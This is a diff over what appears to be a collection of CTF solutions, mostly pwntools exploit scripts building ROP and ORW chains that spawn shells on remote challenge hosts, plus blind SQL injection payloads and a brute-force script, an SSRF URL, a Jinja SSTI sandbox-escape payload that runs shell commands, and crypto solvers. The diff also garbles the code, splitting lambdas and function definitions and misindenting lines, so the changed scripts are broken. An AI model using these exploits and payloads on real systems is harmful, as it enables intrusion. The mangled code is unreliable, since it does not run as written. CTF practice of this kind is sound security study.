@@ -17,7 +17,8 @@ def debug(c = 0):
     else:
         gdb.attach(p)
         pause()
-def get_sb() :return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
+def get_sb() :
+return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 #-----------------------------------------------------------------------------------------
 s = lambda data : p.send(data)
 sa  = lambda text,data  :p.sendafter(text, data)
@@ -25,13 +26,19 @@ sl  = lambda data   :p.sendline(data)
 sla = lambda text,data  :p.sendlineafter(text, data)
 r   = lambda num=4096   :p.recv(num)
 rl  = lambda text   :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter   = lambda        :p.interactive()
-l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
-uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
-int16   = lambda data   :int(data,16)
+l32 = lambda    :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda    :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32    = lambda    :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64    = lambda    :
+u64(p.recv(6).ljust(8,b'x00'))
+int16   = lambda data   :
+int(data,16)
 lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
@@ -96,7 +103,7 @@ def sla(a,b):
     p.sendlineafter(a,b)
 def r(a):
     p.recv(a)
-#def pr(a):
+    #def pr(a):
     #print(p.recv(a))
 def rl(a):
     return p.recvuntil(a)
@@ -117,7 +124,7 @@ context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('./libc.so.6')   
 
 elf=ELF('./pwn')
-#p=remote('47.94.217.82',39104)
+    #p=remote('47.94.217.82',39104)
 p = process('./pwn')
 
 def add(size,content):
@@ -179,7 +186,7 @@ li(hex(fake_IO_addr))
 free(8)
 
 add(0x240, b'./flagx00x00')
-#bug()
+    #bug()
 free(8)
 # 这里把整个unsortedbin申请出来就可以控制tcache指针了
 
@@ -221,7 +228,7 @@ orw += p64(rdi) + p64(1)
 orw += p64(rsi)+p64(heap_base+0x100)
 orw += p64(write)
 
-#bug()
+    #bug()
 rl("4. Exitn")
 sl(str(4))
 
@@ -229,15 +236,10 @@ sleep(0.1)
 sl(orw)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -252,7 +254,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -270,14 +272,14 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
 
 elf=ELF('./pwn')
 p=remote("8.147.132.32",16709)
-#p = process('./pwn')
-#gdb.attach(p,'b *0x401264')
+    #p = process('./pwn')
+    #gdb.attach(p,'b *0x401264')
 sleep(0.1)
 main=0x40127F
 rsi_1=0x4010E0
@@ -305,17 +307,12 @@ rax = libc_base+libc.search(asm("pop raxnret")).__next__()
 ret = libc_base+libc.search(asm("ret")).__next__()
 syscall=libc_base+libc.search(asm("syscallnret")).__next__()
 
-#gdb.attach(p,'b *0x401264')
+    #gdb.attach(p,'b *0x401264')
 pause()
 pay=b'b'*(0x220-4)+p32(0x220-4+1)+p64(0x400600-0x20)+p64(rdi)+p64(bin_sh)+p64(rsi)+p64(0)+p64(rdx_r12)+p64(0)*2+p64(rax)+p64(0x3b)+p64(syscall)
 sl(pay)
 
 inter()
-```
-
-
-
-```
 from pwn import *  # 从 pwntools 库导入所有模块和函数
 libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
 elf = ELF('./girlfriend')  
@@ -388,16 +385,11 @@ payload = b'a'*0x38 + p64(canary) + p64(bss_addr+0x30) + p64(leave_ret)
 talk_her(payload)
 
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 from ctypes import *
 import base64
-#from LibcSearcher import *
+    #from LibcSearcher import *
 
 def debug(c = 0):
     if(c):
@@ -405,7 +397,8 @@ def debug(c = 0):
     else:
         gdb.attach(p)
         pause()
-def get_sb() :return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
+def get_sb() :
+return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 #-----------------------------------------------------------------------------------------
 s = lambda data : p.send(data)
 sa  = lambda text,data  :p.sendafter(text, data)
@@ -413,18 +406,24 @@ sl  = lambda data   :p.sendline(data)
 sla = lambda text,data  :p.sendlineafter(text, data)
 r   = lambda num=4096   :p.recv(num)
 rl  = lambda text   :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter   = lambda        :p.interactive()
-l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
-uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
-int16   = lambda data   :int(data,16)
+l32 = lambda    :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda    :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32    = lambda    :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64    = lambda    :
+u64(p.recv(6).ljust(8,b'x00'))
+int16   = lambda data   :
+int(data,16)
 lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
 context(os='linux', arch='amd64', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('8.147.132.32',29399)
 elf = ELF('./pwn')
 
@@ -442,7 +441,7 @@ sl(b'1')
 sleep(0.5)
 ret=0x40191C
 bss=0x405000+0xa00
-#gdb.attach(p,'b *0x4018A3 ')
+    #gdb.attach(p,'b *0x4018A3 ')
 sleep(0.1)
 payload=b'a'*0x40+p64(bss+0x40)+p64(ret)*2+p64(0x4018A8)
 s(payload)
@@ -456,11 +455,6 @@ payload=pay.ljust(0x40,b'x00')+p64(0x405a00)+p64(leave_ret)
 s(payload)
 
 inter()
-```
-
-
-
-```
 也就是说，system() 调用了 vfork()，产生了一个子进程 27551，然后执行了 /usr/bin/dash（shell），这就是实际去执行 echo bye~ 的地方。
 
 接着：
@@ -520,16 +514,11 @@ gdb
 编辑
 set follow-fork-mode child
 但调 CTF 或分析逻辑通常是留在父进程更合理。
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 from ctypes import *
 import base64
-#from LibcSearcher import *
+    #from LibcSearcher import *
 
 def debug(c = 0):
     if(c):
@@ -537,7 +526,8 @@ def debug(c = 0):
     else:
         gdb.attach(p)
         pause()
-def get_sb() :return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
+def get_sb() :
+return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 #-----------------------------------------------------------------------------------------
 s = lambda data : p.send(data)
 sa  = lambda text,data  :p.sendafter(text, data)
@@ -545,18 +535,24 @@ sl  = lambda data   :p.sendline(data)
 sla = lambda text,data  :p.sendlineafter(text, data)
 r   = lambda num=4096   :p.recv(num)
 rl  = lambda text   :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter   = lambda        :p.interactive()
-l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
-uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
-int16   = lambda data   :int(data,16)
+l32 = lambda    :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda    :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32    = lambda    :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64    = lambda    :
+u64(p.recv(6).ljust(8,b'x00'))
+int16   = lambda data   :
+int(data,16)
 lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
 context(os='linux', arch='amd64', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('8.147.132.32',29399)
 elf = ELF('./pwn')
 
@@ -574,7 +570,7 @@ sl(b'1')
 sleep(0.5)
 ret=0x40191C
 bss=0x405000+0xa00
-#gdb.attach(p,'b *0x4018A3 ')
+    #gdb.attach(p,'b *0x4018A3 ')
 sleep(0.1)
 payload=b'a'*0x40+p64(bss+0x40)+p64(ret)*2+p64(0x4018A8)
 s(payload)
@@ -588,15 +584,10 @@ payload=pay.ljust(0x40,b'x00')+p64(0x405a00)+p64(leave_ret)
 s(payload)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -611,7 +602,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -629,7 +620,7 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
 context(log_level = 'debug',arch = 'mips',endian = 'little')
-#p = process(["qemu-mipsel","-g","9000","-L","./","./pwn"]) #开启9000端口
+    #p = process(["qemu-mipsel","-g","9000","-L","./","./pwn"]) #开启9000端口
 p = remote('39.106.69.240',20611)
 elf = ELF('./pwn')
 
@@ -641,17 +632,7 @@ payload += p32(0x00411010)
 p.sendafter(">", payload)
 
 inter()
-```
-
-
-
-```
 username=admin'%09OR%09substring(database()%09FROM%092%09FOR%091)='e'%23&password=1
-```
-
-
-
-```
 Python
 import requests
 import time
@@ -665,7 +646,8 @@ for pos in range(1, 31):
     for str in range(32, 127):
         payload = f"admin'%09OR%09case%09when%09("ascii(substring((select%09secret%09from%09double_check%09limit%091)%09FROM%09{pos}%09FOR%091))={ascii_code})%09then%091%09else%090%09end=1%23"
         data = {
-            "username":payload,
+            "username":
+payload,
             "password":'1'
         }
         try:
@@ -674,7 +656,8 @@ for pos in range(1, 31):
                 a = True
                 result += chr(str)
                 break
-        except Exception as e:
+        
+except Exception as e:
             print("error")
 
         time.sleep(0.5)
@@ -682,11 +665,6 @@ for pos in range(1, 31):
     if not a:
         break
 print("flag:", flag)
-```
-
-
-
-```
 from bottle import Bottle, request, response,run, route
 
 app = Bottle()
@@ -703,35 +681,16 @@ def secret_page():
     
 
 run(host='127.0.0.1', port=8081, debug=False)
-```
-
-
-
-```
-?url=@2130706433:8080/1337
-```
-
-
-
-```
+?url=@2130706433:
+8080/1337
 req = binary_to_string(req)
                 print(req)
                 req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
-```
-
-
-
-```
 def binary_to_string(binary_string):
     if len(binary_string) % 8 != 0:
         raise ValueError("Binary string length must be a multiple of 8")
     binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
     string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)
-```
-
-
-
-```
 Fate = [
     ('JOHN', '1994-2030 Dead in a car accident'),
     ('JANE', '1990-2025 Lost in a fire'),
@@ -744,29 +703,15 @@ Fate = [
     ('JACOB', '1954-1990 Lost in a plane crash'),
     ('LAMENTXU', r'2024 Send you a flag flag{FAKE}')
 ]
-```
-
-
-
-```
 {"name":{"admin')))))))or 1 order by 1 DESC-- ":"a"}}
-```
-
-
-
-```
-011110110010001001101110011000010110110101100101001000100011101001111011001000100110000101100100011011010110100101101110001001110010100100101001001010010010100100101001001010010010100101101111011100100010000000110001001000000110111101110010011001000110010101110010001000000110001001111001001000000011000100101101001011010010000000100010001110100010001001100010001000100111110101111101
-```
-
-
-
-```
-?url=@2130706433:8080/1337?0=%61%62%63%64%65%66%67%68%69&1=011110110010001001101110011000010110110101100101001000100011101001111011001000100110000101100100011011010110100101101110001001110010100100101001001010010010100100101001001010010010100101101111011100100010000000110001001000000110111101110010011001000110010101110010001000000110001001111001001000000011000100101101001011010010000000100010001110100010001001100010001000100111110101111101
-```
-
-
-
-```
+0111101100100010011011100110000101101101011001010010001000111010011110110010
+0010011000010110010001101101011010010110111000100111001010010010100100101001
+0010100100101001001010010010100101101111011100100010000000110001001000000110
+1111011100100110010001100101011100100010000001100010011110010010000000110001
+0010110100101101001000000010001000111010001000100110001000100010011111010111
+1101
+?url=@2130706433:
+8080/1337?0=%61%62%63%64%65%66%67%68%69&1=011110110010001001101110011000010110110101100101001000100011101001111011001000100110000101100100011011010110100101101110001001110010100100101001001010010010100100101001001010010010100101101111011100100010000000110001001000000110111101110010011001000110010101110010001000000110001001111001001000000011000100101101001011010010000000100010001110100010001001100010001000100111110101111101
 类似隐写，记事本打开，源码
 # YOU FOUND ME ;)
 # -*- encoding: utf-8 -*-
@@ -826,10 +771,12 @@ def r3al_ins1de_th0ught():
                 return a
             else:
                 return 'My inside world is always hidden.'
-        except RuntimeError as e:
+        
+except RuntimeError as e:
             counter = 0
             return 'NO.'
-        except Exception as e:
+        
+except Exception as e:
             return 'Error'
     else:
         return 'Welcome to Hidden_route!'
@@ -839,7 +786,8 @@ if __name__ == '__main__':
     try:
         import _posixsubprocess
         del _posixsubprocess.fork_exec
-    except:
+    
+except:
         pass
     import subprocess
     del os.popen
@@ -861,19 +809,10 @@ if __name__ == '__main__':
 
 python沙箱逃逸ssti，用config.update写进config，目的是把全局变量都写入config,这样引用只需要config就行，request的mimetype属性绕过下划线，%09绕过空格，{%%}要用set语句赋值
 {%25set%09x=config%25}{%25set%09a=x.update(cmd=request.mimetype)%25}{%25print(x|attr(x.cla)|attr(x.i)|attr(x.glo))%}读取到__globals__
-```
-
-
-
-```
 payload:
 ?My_ins1de_w0r1d=Follow-your-heart-{%25set%09x=config%25}{%25set%09a=x.update(cmd=request.mimetype)%25}{%25print(x|attr(x.cla)|attr(x.in)|attr(x.glo)|attr(x.gett)(x.bul)|attr(x.gett)(x.ev)(x.cmd))%25} 
-Content-Type:__import__("subprocess").getoutput('cat /flag_h3r3 >static/1.txt')//先mkdir static
-```
-
-
-
-```
+Content-Type:
+__import__("subprocess").getoutput('cat /flag_h3r3 >static/1.txt')//先mkdir static
 from pwn import *
 from tqdm import *
 from mt19937predictor import MT19937Predictor
@@ -901,11 +840,6 @@ correct_ans = rand1 // rand2
 o.sendline(str(correct_ans))
 print(o.recv())
 print(o.recv())
-```
-
-
-
-```
 import itertools
 from Crypto.Cipher import ChaCha20
 import hashlib
@@ -963,11 +897,6 @@ f1=((mh[0]+x)^3-3*(mh[0]+x)*(mh[1]+y)^2)-C[0]
 res=small_roots(f1,bounds=(2^128,2^128),m=1,d=3)
 print(ChaCha20.new(key=hashlib.sha256(str(res[0][0]+mh[0]+mh[1] +res[0][1]).encode()).digest(), nonce=b'Pr3d1ctmyxjj').decrypt(enc))
 # XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}
-```
-
-
-
-```
 def crc64(data, prev=0xFFFFFFFFFFFFFFFF):
     POLY = 0x42F0E1EBA9EA3693
     crc = prev
@@ -1009,11 +938,6 @@ for i in enc:
             break
 print(flag.decode())
 #
-```
-
-
-
-```
 import moon
 help(moon)
 
@@ -1021,12 +945,7 @@ enc = "426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7"
 data = bytes.fromhex(enc)
 flag = moon.xor_crypt(1131796, data)
 print(flag)
-#b'flag{but_y0u_l00k3d_up_@t_th3_mOOn}'
-```
-
-
-
-```
+    #b'flag{but_y0u_l00k3d_up_@t_th3_mOOn}'
 import re
 
 def extract_bf_segments(code):
